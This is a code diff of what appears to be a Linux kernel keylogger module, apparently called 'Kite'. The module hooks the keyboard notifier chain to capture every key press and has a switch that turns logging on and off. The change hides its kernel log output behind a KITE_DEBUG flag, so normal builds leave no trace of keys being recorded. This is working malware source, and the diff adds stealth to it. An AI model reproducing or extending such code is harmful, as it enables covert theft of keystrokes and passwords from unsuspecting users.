@@ -17,7 +17,9 @@ static int log_keys(struct notifier_block *nb, unsigned long action, void * data
     struct keyboard_notifier_param *knd = data;     //<- Get the data for the callback into "knd"
     if ((action == KBD_KEYSYM) && (knd->down))       //<- Check if the callback happened because a ascii key pressed
     {
-            pr_info("Pressed key '%c' with value '%d'.\n", knd->value, knd->value);
+#ifdef KITE_DEBUG
+		pr_info("Pressed key '%c' with value '%d'.\n", knd->value, knd->value);
+#endif
     }
 
     return NOTIFY_OK;
@@ -30,14 +32,21 @@ static struct notifier_block logger_notification_block = {
 };
 
 static int switch_key_logging(void){
-    pr_info("Switch key logging\n");
+#ifdef KITE_DEBUG
+	pr_info("Switch key logging\n");
+#endif
     if(KEYLOG_ACTIVE){
-        pr_info("Stopping keylogging\n");
+#ifdef KITE_DEBUG
+		pr_info("Stopping keylogging\n");
+#endif
         unregister_keyboard_notifier(&logger_notification_block);
         KEYLOG_ACTIVE = 0;
     }
     else{
-        pr_info("Starting keylogging\n");
+#ifdef KITE_DEBUG
+		pr_info("Starting keylogging\n");
+#endif
+
         register_keyboard_notifier(&logger_notification_block);
         KEYLOG_ACTIVE = 1;
     }
@@ -52,7 +61,7 @@ static int switch_key_logging(void){
   then log the keys
 
 static int logger(char *str, int count){
-    pr_info("%s", str);
+	pr_info("%s", str);
     return 0;
 }
 
